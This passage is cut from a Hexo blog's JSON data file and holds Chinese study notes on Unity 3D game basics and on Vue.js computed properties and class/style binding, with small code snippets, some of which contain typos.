class=\"headerlink\" title=\"2.光照\"></a>2.光照</h3><ul>\n<li>类型：点光源、平行光、聚光灯、面积光</li>\n<li>颜色</li>\n<li>强度</li>\n<li>阴影乐星</li>\n</ul>\n<h3 id=\"3-天空盒\"><a href=\"#3-天空盒\" class=\"headerlink\" title=\"3.天空盒\"></a>3.天空盒</h3><ul>\n<li>相机的清除标志设为“天空盒”</li>\n<li>窗口-渲染-照明设置</li>\n<li>环境-天空盒材质</li>\n</ul>\n<h2 id=\"三、控制和碰撞\"><a href=\"#三、控制和碰撞\" class=\"headerlink\" title=\"三、控制和碰撞\"></a>三、控制和碰撞</h2><h3 id=\"1-启动流程\"><a href=\"#1-启动流程\" class=\"headerlink\" title=\"1.启动流程\"></a>1.启动流程</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/15/e6cf1e6d09956c34.jpg\"></p>\n<h3 id=\"2-控制逻辑\"><a href=\"#2-控制逻辑\" class=\"headerlink\" title=\"2.控制逻辑\"></a>2.控制逻辑</h3><ul>\n<li>添加刚体组件（运动过程中不会发生形变的物体）</li>\n</ul>\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs ada\">添加组件；<br><span class=\"hljs-keyword\">Use</span> Gravity设置为<span class=\"hljs-literal\">false</span><br>isKinematic设置为<span class=\"hljs-literal\">true</span>，飞船通过脚本而非力影响运动属性<br>设置constraints，冻结z轴位移以及x、y、z轴旋转<br><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>添加自定义脚本</li>\n</ul>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\"><span class=\"hljs-built_in\">add</span> component &gt; new<span class=\"hljs-built_in\"> script</span><br><span class=\"hljs-built_in\"></span><br>MonoBehavior是一个基类，所有Unity脚本都派生自该类；<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/15/99791d98ab219a60.jpg\"></p>\n<h4 id=\"Input-GetAxis-和输入管理器InputManager\"><a href=\"#Input-GetAxis-和输入管理器InputManager\" class=\"headerlink\" title=\"Input.GetAxis()和输入管理器InputManager\"></a>Input.GetAxis()和输入管理器InputManager</h4><blockquote>\n<p>InputManager是Unity设置输入响应方式的管理列表，Edit &gt; Project &gt; Setting &gt; Input</p>\n</blockquote>\n<ul>\n<li>添加敌机</li>\n</ul>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">需要使用另一个脚本；<br>不受按键控制；<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">随机生成敌机<br>新建一个<span class=\"hljs-selector-tag\">Main</span>的C#脚本，绑定到<span class=\"hljs-selector-tag\">Main</span> camera(因为敌机伴随整个游戏周期，所以绑定到Camera)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-碰撞逻辑\"><a href=\"#3-碰撞逻辑\" class=\"headerlink\" title=\"3.碰撞逻辑\"></a>3.碰撞逻辑</h3><h4 id=\"标签\"><a href=\"#标签\" class=\"headerlink\" title=\"标签\"></a>标签</h4><blockquote>\n<p>Edit &gt; Project &gt;Tags and Layers 命令</p>\n<p>不同Layers的实体不会发生碰撞；</p>\n</blockquote>\n<h4 id=\"物理管理器\"><a href=\"#物理管理器\" class=\"headerlink\" title=\"物理管理器\"></a>物理管理器</h4><blockquote>\n<p>Edit &gt; Project Setting &gt; Physics</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/15/5bba664ee9c8df56.jpg\"></p>\n<h4 id=\"碰撞\"><a href=\"#碰撞\" class=\"headerlink\" title=\"碰撞\"></a>碰撞</h4><blockquote>\n<p>3D中球体的体积碰撞只需要计算两个球体球心的距离和两个实体半径之和；</p>\n</blockquote>\n<h2 id=\"四、玩法逻辑和UI\"><a href=\"#四、玩法逻辑和UI\" class=\"headerlink\" title=\"四、玩法逻辑和UI\"></a>四、玩法逻辑和UI</h2><h3 id=\"1-添加新的刚体\"><a href=\"#1-添加新的刚体\" class=\"headerlink\" title=\"1.添加新的刚体\"></a>1.添加新的刚体</h3><ul>\n<li>子弹</li>\n<li>升级道具</li>\n</ul>\n<h3 id=\"2-添加玩法\"><a href=\"#2-添加玩法\" class=\"headerlink\" title=\"2.添加玩法\"></a>2.添加玩法</h3><ul>\n<li>为每一个敌机设计分数</li>\n<li>添加计分板</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/15/5d64aadbdbbbbe32.jpg\"></p>\n<h5 id=\"推荐课程\"><a href=\"#推荐课程\" class=\"headerlink\" title=\"推荐课程\"></a>推荐课程</h5><ul>\n<li>现代计算机图形学入门-闫令其</li>\n<li>现代游戏引擎入门必修课-王希</li>\n<li>高质量试试渲染-闫</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"3D游戏开发\"><a href=\"#3D游戏开发\" class=\"headerlink\" title=\"3D游戏开发\"></a>3D游戏开发</h1><h2 id=\"一、3D实体搭建\"><a href=\"#一、3D实体搭建\" class=\"headerlink\" title=\"一、3D实体搭建\"></a>一、3D实体搭建</h2><h3 id=\"1-3D实体\"><a href=\"#1-3D实体\" class=\"headerlink\" title=\"1.3D实体\"></a>1.3D实体</h3><h4 id=\"位姿态\"><a href=\"#位姿态\" class=\"headerlink\" title=\"位姿态\"></a>位姿态</h4><ul>\n<li>位置：Position（x,y,z）</li>\n<li>旋转：Rotation（x,y,z)</li>\n<li>缩放：Scale（x,y,z)</li>\n</ul>\n<blockquote>\n<p>Unity中，绝大部分情况下，是先缩放，后旋转，最后平移；</p>\n</blockquote>\n<h4 id=\"3D实体的创建\"><a href=\"#3D实体的创建\" class=\"headerlink\" title=\"3D实体的创建\"></a>3D实体的创建</h4><ul>\n<li>通过加载3D模型创建，如fbx、gltf、obj</li>\n<li>通过组合参数化的基本集合体创建</li>\n</ul>\n<h4 id=\"实体绘制\"><a href=\"#实体绘制\" class=\"headerlink\" title=\"实体绘制\"></a>实体绘制</h4><ul>\n<li>材质</li>\n<li>颜色</li>\n<li>纹理</li>\n</ul>\n<h4 id=\"预制体\"><a href=\"#预制体\" class=\"headerlink\" title=\"预制体\"></a>预制体</h4><ul>\n<li>将游戏对象保存在工程中，在需要的时候创建出来，这就是预制体；</li>\n<li>预制体存储者一个游戏对象，包括游戏对象的所有组件以及其下的所有子游戏对象；</li>\n</ul>\n<h2 id=\"二、相机、光照、天空盒\"><a href=\"#二、相机、光照、天空盒\" class=\"headerlink\" title=\"二、相机、光照、天空盒\"></a>二、相机、光照、天空盒</h2><h3 id=\"1-相机\"><a href=\"#1-相机\" class=\"headerlink\" title=\"1.相机\"></a>1.相机</h3><ul>\n<li>Clear Flag</li>\n<li>背景颜色</li>\n<li>Culling Mask</li>\n<li>投影（透视、正交）</li>\n</ul>\n<p>透视是存在近大远小，正交是没有的；</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/15/4dc7ee72a6e9dfda.jpg\"></p>\n<h3 id=\"2-光照\"><a href=\"#2-光照\" class=\"headerlink\" title=\"2.光照\"></a>2.光照</h3><ul>\n<li>类型：点光源、平行光、聚光灯、面积光</li>\n<li>颜色</li>\n<li>强度</li>\n<li>阴影乐星</li>\n</ul>\n<h3 id=\"3-天空盒\"><a href=\"#3-天空盒\" class=\"headerlink\" title=\"3.天空盒\"></a>3.天空盒</h3><ul>\n<li>相机的清除标志设为“天空盒”</li>\n<li>窗口-渲染-照明设置</li>\n<li>环境-天空盒材质</li>\n</ul>\n<h2 id=\"三、控制和碰撞\"><a href=\"#三、控制和碰撞\" class=\"headerlink\" title=\"三、控制和碰撞\"></a>三、控制和碰撞</h2><h3 id=\"1-启动流程\"><a href=\"#1-启动流程\" class=\"headerlink\" title=\"1.启动流程\"></a>1.启动流程</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/15/e6cf1e6d09956c34.jpg\"></p>\n<h3 id=\"2-控制逻辑\"><a href=\"#2-控制逻辑\" class=\"headerlink\" title=\"2.控制逻辑\"></a>2.控制逻辑</h3><ul>\n<li>添加刚体组件（运动过程中不会发生形变的物体）</li>\n</ul>\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs ada\">添加组件；<br><span class=\"hljs-keyword\">Use</span> Gravity设置为<span class=\"hljs-literal\">false</span><br>isKinematic设置为<span class=\"hljs-literal\">true</span>，飞船通过脚本而非力影响运动属性<br>设置constraints，冻结z轴位移以及x、y、z轴旋转<br><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>添加自定义脚本</li>\n</ul>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\"><span class=\"hljs-built_in\">add</span> component &gt; new<span class=\"hljs-built_in\"> script</span><br><span class=\"hljs-built_in\"></span><br>MonoBehavior是一个基类，所有Unity脚本都派生自该类；<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/15/99791d98ab219a60.jpg\"></p>\n<h4 id=\"Input-GetAxis-和输入管理器InputManager\"><a href=\"#Input-GetAxis-和输入管理器InputManager\" class=\"headerlink\" title=\"Input.GetAxis()和输入管理器InputManager\"></a>Input.GetAxis()和输入管理器InputManager</h4><blockquote>\n<p>InputManager是Unity设置输入响应方式的管理列表，Edit &gt; Project &gt; Setting &gt; Input</p>\n</blockquote>\n<ul>\n<li>添加敌机</li>\n</ul>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">需要使用另一个脚本；<br>不受按键控制；<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">随机生成敌机<br>新建一个<span class=\"hljs-selector-tag\">Main</span>的C#脚本，绑定到<span class=\"hljs-selector-tag\">Main</span> camera(因为敌机伴随整个游戏周期，所以绑定到Camera)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-碰撞逻辑\"><a href=\"#3-碰撞逻辑\" class=\"headerlink\" title=\"3.碰撞逻辑\"></a>3.碰撞逻辑</h3><h4 id=\"标签\"><a href=\"#标签\" class=\"headerlink\" title=\"标签\"></a>标签</h4><blockquote>\n<p>Edit &gt; Project &gt;Tags and Layers 命令</p>\n<p>不同Layers的实体不会发生碰撞；</p>\n</blockquote>\n<h4 id=\"物理管理器\"><a href=\"#物理管理器\" class=\"headerlink\" title=\"物理管理器\"></a>物理管理器</h4><blockquote>\n<p>Edit &gt; Project Setting &gt; Physics</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/15/5bba664ee9c8df56.jpg\"></p>\n<h4 id=\"碰撞\"><a href=\"#碰撞\" class=\"headerlink\" title=\"碰撞\"></a>碰撞</h4><blockquote>\n<p>3D中球体的体积碰撞只需要计算两个球体球心的距离和两个实体半径之和；</p>\n</blockquote>\n<h2 id=\"四、玩法逻辑和UI\"><a href=\"#四、玩法逻辑和UI\" class=\"headerlink\" title=\"四、玩法逻辑和UI\"></a>四、玩法逻辑和UI</h2><h3 id=\"1-添加新的刚体\"><a href=\"#1-添加新的刚体\" class=\"headerlink\" title=\"1.添加新的刚体\"></a>1.添加新的刚体</h3><ul>\n<li>子弹</li>\n<li>升级道具</li>\n</ul>\n<h3 id=\"2-添加玩法\"><a href=\"#2-添加玩法\" class=\"headerlink\" title=\"2.添加玩法\"></a>2.添加玩法</h3><ul>\n<li>为每一个敌机设计分数</li>\n<li>添加计分板</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/15/5d64aadbdbbbbe32.jpg\"></p>\n<h5 id=\"推荐课程\"><a href=\"#推荐课程\" class=\"headerlink\" title=\"推荐课程\"></a>推荐课程</h5><ul>\n<li>现代计算机图形学入门-闫令其</li>\n<li>现代游戏引擎入门必修课-王希</li>\n<li>高质量试试渲染-闫</li>\n</ul>\n"},{"title":"Vue.js实战（2）","date":"2020-11-18T10:03:45.000Z","mp3":null,"cover":"img/vue_js_shizhan.jpg","_content":"\n# Ch3 计算属性\n\n1.计算属性：遇到复杂的逻辑时，使用计算属性；将所有的计算属性以函数的形式卸载Vue实例的computed属性内，返回计算结果；\n\n```html\n  <div>\n            {{ reversedText }}\n        </div>\n        \n  <script>\n\t        data:{\n                text: '123,456',\n            },\n            computed:{\n                reversedText: function(){\n                    return this.text.split(',').reverse().join(',');\n                }\n</script>\n```\n\n2.用法\n\n计算属性可以依赖多个vue实例的数据，只要其中一个数据发生变化，计算属性就会重新执行，视图也会更新；\n\n3.和methods的区别\n\n```html\n<div>\n    {{ reversedText }}\n</div>\n\n<scirpt>\n\tmethods:{\n    \treverserText:function(){\n    \t\treturn this.text.split(',').reverser().join(',');\n    \t}\n    },\n    computed:{\n    \t reversedText: function(){\n         \treturn this.text.split(',').reverse().join(',');\n    }\n</scirpt>\n```\n\n两者实现了相同的效果，但是计算属性是基于依赖缓存，一个依赖数据发生变化，才会重新取值；methods只要重新渲染，就会调用；\n\n当遍历大数组和做大量计算时，应使用计算属性，除非不用缓存；\n\n\n\n# CH4 v-bind及class与style的绑定\n\n1.v-bind指令\n\n```html\n<div>\n    <a v-bind:href=\"url\">链接</a>\n    <img v-bind:src:=\"imageUrl\"/>\n    \n     <a :href=\"url\">链接</a>\n    <img :src=\"imageUrl\"/>\n</div>\n\n<script>\n\tdata:{\n        url:'...',\n        imageUrl:'...',\n    }\n</script>\n```\n\n2.绑定class的几种方法\n\n​\t（1）表达式为真，则加载css\n\n```html\n        <div :class=\"{ 'active':isActive,'error':isError }\"></div>\n\n\t   <script>\n\t\tdata:{\n             isActive: true,\n             isError:false,\n        }\n        </script>\n```\n\n​\t（2）使用computed\n\n```html\n\t<div :class=\"classes\"></div>\n\n\t<script>\n        computed:function(){\n            return:{\n                active:this.isActive,\n            }\n        }\n\t</script>\n```\n\n​\t(3)组件上使用\n\n​\t\n\n```html\n  <style>\n        .article{\n            color: red;\n        }\n        .active{\n            color: black;\n            font-size: 30px;\n        }\n    </style>\n\n <div id=\"app\">\n        <my-component :class=\"{ 'active': isActive }\"></my-component>\n    </div>>\n\n<script>\n    Vue.component('my-component',{\n        template:'<p class=\"article\">这是一个组件</p>'\n    })\n    var app=new Vue({\n        el:'#app',\n        data:{\n            isActive:true\n        }\n    })\n</script>\n\n```\n\n3.绑定内联样式\n\n```html\n<div :style=\"styles\">\n            这是第二个组件\n        </div>\n        \n  data:{\n            isActive:true,\n            styles:{\n                color:'pink',\n                fontSize: 35 +'px'\n            }\n        }\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/Ch3 计算属性.md","raw":"---\ntitle: Vue.js实战（2）\ndate: 2020-11-18 18:03:45\ncategories: \n    - 前端\ntags: \n    - VUE\n    - 笔记\n    - Vue.js实战\nmp3: \ncover: img/vue_js_shizhan.jpg\n---\n\n# Ch3 计算属性\n\n1.计算属性：遇到复杂的逻辑时，使用计算属性；将所有的计算属性以函数的形式卸载Vue实例的computed属性内，返回计算结果；\n\n```html\n  <div>\n            {{ reversedText }}\n        </div>\n        \n  <script>\n\t        data:{\n                text: '123,456',\n            },\n            computed:{\n                reversedText: function(){\n                    return this.text.split(',').reverse().join(',');\n                }\n</script>\n```\n\n2.用法\n\n计算属性可以依赖多个vue实例的数据，只要其中一个数据发生变化，计算属性就会重新执行，视图也会更新；\n\n3.和methods的区别\n\n```html\n<div>\n    {{ reversedText }}\n</div>\n\n<scirpt>\n\tmethods:{\n    \treverserText:function(){\n    \t\treturn this.text.split(',').reverser().join(',');\n    \t}\n    },\n    computed:{\n    \t reversedText: function(){\n         \treturn this.text.split(',').reverse().join(',');\n    }\n</scirpt>\n```\n\n两者实现了相同的效果，但是计算属性是基于依赖缓存，一个依赖数据发生变化，才会重新取值；methods只要重新渲染，就会调用；\n\n当遍历大数组和做大量计算时，应使用计算属性，除非不用缓存；\n\n\n\n# CH4 v-bind及class与style的绑定\n\n1.v-bind指令\n\n```html\n<div>\n    <a v-bind:href=\"url\">链接</a>\n    <img v-bind:src:=\"imageUrl\"/>\n    \n     <a :href=\"url\">链接</a>\n    <img :src=\"imageUrl\"/>\n</div>\n\n<script>\n\tdata:{\n        url:'...',\n        imageUrl:'...',\n    }\n</script>\n```\n\n2.绑定class的几种方法\n\n​\t（1）表达式为真，则加载css\n\n```html\n        <div :class=\"{ 'active':isActive,'error':isError }\"></div>\n\n\t   <script>\n\t\tdata:{\n             isActive: true,\n             isError:false,\n        }\n        </script>\n```\n\n​\t（2）使用computed\n\n```html\n\t<div :class=\"classes\"></div>\n\n\t<script>\n        computed:function(){\n            return:{\n                active:this.isActive,\n            }\n        }\n\t</script>\n```\n\n​\t(3)组件上使用\n\n​\t\n\n```html\n  <style>\n        .article{\n            color: red;\n        }\n        .active{\n            color: black;\n            font-size: 30px;\n        }\n    </style>\n\n <div id=\"app\">\n        <my-component :class=\"{ 'active': isActive }\"></my-component>\n    </div>>\n\n<script>\n    Vue.component('my-component',{\n        template:'<p class=\"article\">这是一个组件</p>'\n    })\n    var app=new Vue({\n        el:'#app',\n        data:{\n            isActive:true\n        }\n    })\n</script>\n\n```\n\n3.绑定内联样式\n\n```html\n<div :style=\"styles\">\n            这是第二个组件\n        </div>\n        \n  data:{\n            isActive:true,\n            styles:{\n                color:'pink',\n                fontSize: 35 +'px'\n            }\n        }\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"Ch3 计算属性","published":1,"updated":"2020-11-18T10:03:42.000Z","_id":"clg29vyh10030ao9c099g6djl","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Ch3-计算属性\"><a href=\"#Ch3-计算属性\" class=\"headerlink\" title=\"Ch3 计算属性\"></a>Ch3 计算属性</h1><p>1.计算属性：遇到复杂的逻辑时，使用计算属性；将所有的计算属性以函数的形式卸载Vue实例的computed属性内，返回计算结果；</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><br>            &#123;&#123; reversedText &#125;&#125;<br>        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>        <br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">\t        <span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">text</span>: <span class=\"hljs-string\">&#x27;123,456&#x27;</span>,</span><br><span class=\"language-javascript\">            &#125;,</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">computed</span>:&#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">reversedText</span>: <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">text</span>.<span class=\"hljs-title function_\">split</span>(<span class=\"hljs-string\">&#x27;,&#x27;</span>).<span class=\"hljs-title function_\">reverse</span>().<span class=\"hljs-title function_\">join</span>(<span class=\"hljs-string\">&#x27;,&#x27;</span>);</span><br><span class=\"language-javascript\">                &#125;</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>2.用法</p>\n<p>计算属性可以依赖多个vue实例的数据，只要其中一个数据发生变化，计算属性就会重新执行，视图也会更新；</p>\n<p>3.和methods的区别</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><br>    &#123;&#123; reversedText &#125;&#125;<br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">scirpt</span>&gt;</span><br>\tmethods:&#123;<br>    \treverserText:function()&#123;<br>    \t\treturn this.text.split(&#x27;,&#x27;).reverser().join(&#x27;,&#x27;);<br>    \t&#125;<br>    &#125;,<br>    computed:&#123;<br>    \t reversedText: function()&#123;<br>         \treturn this.text.split(&#x27;,&#x27;).reverse().join(&#x27;,&#x27;);<br>    &#125;<br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">scirpt</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>两者实现了相同的效果，但是计算属性是基于依赖缓存，一个依赖数据发生变化，才会重新取值；methods只要重新渲染，就会调用；</p>\n<p>当遍历大数组和做大量计算时，应使用计算属性，除非不用缓存；</p>\n<h1 id=\"CH4-v-bind及class与style的绑定\"><a href=\"#CH4-v-bind及class与style的绑定\" class=\"headerlink\" title=\"CH4 v-bind及class与style的绑定\"></a>CH4 v-bind及class与style的绑定</h1><p>1.v-bind指令</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">v-bind:href</span>=<span class=\"hljs-string\">&quot;url&quot;</span>&gt;</span>链接<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">v-bind:src:</span>=<span class=\"hljs-string\">&quot;imageUrl&quot;</span>/&gt;</span><br>    <br>     <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">:href</span>=<span class=\"hljs-string\">&quot;url&quot;</span>&gt;</span>链接<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">:src</span>=<span class=\"hljs-string\">&quot;imageUrl&quot;</span>/&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">\t<span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">url</span>:<span class=\"hljs-string\">&#x27;...&#x27;</span>,</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">imageUrl</span>:<span class=\"hljs-string\">&#x27;...&#x27;</span>,</span><br><span class=\"language-javascript\">    &#125;</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>2.绑定class的几种方法</p>\n<p>​    （1）表达式为真，则加载css</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">:class</span>=<span class=\"hljs-string\">&quot;&#123; &#x27;active&#x27;:isActive,&#x27;error&#x27;:isError &#125;&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\"><span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">isActive</span>: <span class=\"hljs-literal\">true</span>,</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">isError</span>:<span class=\"hljs-literal\">false</span>,</span><br><span class=\"language-javascript\">      &#125;</span><br><span class=\"language-javascript\">      </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>​    （2）使用computed</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">:class</span>=<span class=\"hljs-string\">&quot;classes&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">       <span class=\"hljs-attr\">computed</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">return</span>:&#123;</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">active</span>:<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">isActive</span>,</span><br><span class=\"language-javascript\">           &#125;</span><br><span class=\"language-javascript\">       &#125;</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>​    (3)组件上使用</p>\n<p>​    </p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">style</span>&gt;</span><span class=\"language-css\"></span><br><span class=\"language-css\">        <span class=\"hljs-selector-class\">.article</span>&#123;</span><br><span class=\"language-css\">            <span class=\"hljs-attribute\">color</span>: red;</span><br><span class=\"language-css\">        &#125;</span><br><span class=\"language-css\">        <span class=\"hljs-selector-class\">.active</span>&#123;</span><br><span class=\"language-css\">            <span class=\"hljs-attribute\">color</span>: black;</span><br><span class=\"language-css\">            <span class=\"hljs-attribute\">font-size</span>: <span class=\"hljs-number\">30px</span>;</span><br><span class=\"language-css\">        &#125;</span><br><span class=\"language-css\">    </span><span class=\"hljs-tag\">&lt;/<span 